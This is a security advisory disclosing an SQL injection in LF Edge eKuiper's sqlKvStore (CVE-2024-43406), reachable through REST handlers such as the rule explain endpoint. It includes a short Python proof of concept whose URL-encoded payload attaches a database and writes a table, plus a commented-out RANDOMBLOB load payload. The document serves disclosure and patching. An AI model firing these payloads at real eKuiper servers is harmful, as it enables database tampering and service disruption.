# LF Edge eKuiper has a SQL Injection in sqlKvStore

**GHSA**: GHSA-r5ph-4jxm-6j9p | **CVE**: CVE-2024-43406 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-89

**Affected Packages**:
- **github.com/lf-edge/ekuiper** (go): < 1.14.2
- **ekuiper** (pip): >= 0, < 1.14.2

## Description

### Summary
A user could utilize and exploit SQL Injection to allow the execution of malicious SQL query via Get method in sqlKvStore. 

### Details
I will use explainRuleHandler ("/rules/{name}/explain") as an example to illustrate. However, this vulnerability also exists in other methods such as sourceManageHandler, asyncTaskCancelHandler, pluginHandler, etc.

The SQL injection can happen in the code:
https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L89-L93
The code to accept user input is:
https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/server/rest.go#L274-L277

The rule id in the above code can be used to exploit SQL query.

Note that the delete function is also vulnerable:
https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L138-L141

### PoC
```
import requests
from urllib.parse import quote

# SELECT val FROM 'xxx' WHERE key='%s';
payload = f"""'; ATTACH DATABASE 'test93' AS test93;
CREATE TABLE test93.pwn (dataz text);
INSERT INTO test93.pwn (dataz) VALUES ("sql injection");--"""

#payload = "deadbeef'; SELECT 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))));--"

url = f"http://127.0.0.1:9081/rules/{quote(payload,safe='')}/explain"   # explainRuleHandler

res = requests.get(url)
print(res.content)
```

The screenshot shows the malicious SQL query to insert a value:
![image](https://github.com/user-attachments/assets/baf035cc-a561-4909-8d1f-e455e75375cb)

The screenshot shows the breakpoint of executing the query:
![image](https://github.com/user-attachments/assets/b9c29945-a0cc-4271-bdc8-c1bddfda5b6f)




### Impact
SQL Injection vulnerability

The reporters are Yuan Luo, Shuai Xiong, Haoyu Wang from Tencent YunDing Security Lab.

